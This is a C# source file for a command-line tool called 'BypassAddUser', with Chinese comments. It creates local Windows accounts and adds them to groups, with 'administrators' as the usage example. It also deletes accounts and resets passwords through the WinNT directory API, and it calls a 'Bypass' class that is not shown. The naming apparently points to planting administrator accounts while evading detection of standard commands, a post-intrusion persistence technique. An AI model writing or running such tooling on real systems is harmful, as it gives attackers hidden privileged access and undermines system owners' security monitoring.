using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BypassAddUser
{
    class Program
    {
        [DllImport("kernel32.dll")]
        //链接：https://blog.csdn.net/zxh2075/article/details/8621243
        //链接：https://docs.microsoft.com/zh-cn/dotnet/framework/unmanaged-api/hosting/iclrmetahost-exitprocess-method
        static extern void ExitProcess(uint ExitCode);

        static void Main(string[] args)
        {
            string judgeUser = "-u";
            string judgePass = "-p";
            string judgeGroup = "-g";
            string judgeChange = "-c";
            string judgeDelete = "-d";

            if (args.Length == 6 && args[0].Equals(judgeUser, StringComparison.OrdinalIgnoreCase) &&
                args[2].Equals(judgePass, StringComparison.OrdinalIgnoreCase) &&
                args[4].Equals(judgeGroup, StringComparison.OrdinalIgnoreCase))
            {
                Bypass bypass = new Bypass();
                string username = args[1];
                string password = args[3];
                string groupname = args[5];
                bypass.AddUser(username, password);
                bypass.GroupAddMembers(groupname, username);
                ExitProcess(1); //结束进程及其所有的线程

            }
            else if (args.Length == 2 && args[0].Equals(judgeDelete, StringComparison.OrdinalIgnoreCase))
            {
                Bypass bypass = new Bypass();
                bypass.UserDelete(args[1]);
                ExitProcess(1);
            }
            else if (args.Length ==3 && args[0].Equals(judgeChange,StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    UpdateUserPassword(args[1], args[2]);
                }
                catch (System.Runtime.InteropServices.COMException)
                {
                    Console.WriteLine("可能是用户名所引起的错误，请检查：用户名输入是否正确");

                }
                catch (System.Reflection.TargetInvocationException)
                {
                    Console.WriteLine("可能是因为：“当前设置的密码不满足密码策略的要求” 所引起的错误，请检查：最小密码长度、密码复杂性和密码历史的要求");
                }
            }

            else
            {
                Console.WriteLine("Usage: BypassAddUser.exe -u/-U username -p/-P password -g/-G groups");
                Console.WriteLine("       BypassAddUser.exe -c/-C UserName NewPassword");
                Console.WriteLine("       BypassAddUser.exe -d/-D UserName");
                Console.WriteLine("Example: BypassAddUser.exe -u test -p testpass -g administrators");
                Console.WriteLine("         BypassAddUser.exe -c test NewtestPass");
                Console.WriteLine("         BypassAddUser.exe -d test");
            }

        }

        /// <summary>
        /// 更改密码
        /// </summary>
        private static readonly string PATH = "WinNT://" + Environment.MachineName;
        public static void UpdateUserPassword(string username, string newpassword)
        {
            using (DirectoryEntry dir = new DirectoryEntry(PATH))
            {
                using (DirectoryEntry user = dir.Children.Find(username, "user"))
                {
                    user.Invoke("SetPassword", new object[] { newpassword });
                    user.CommitChanges();
                    Console.WriteLine("Success Change Password!!!");
                }
            }
        }
    }
}
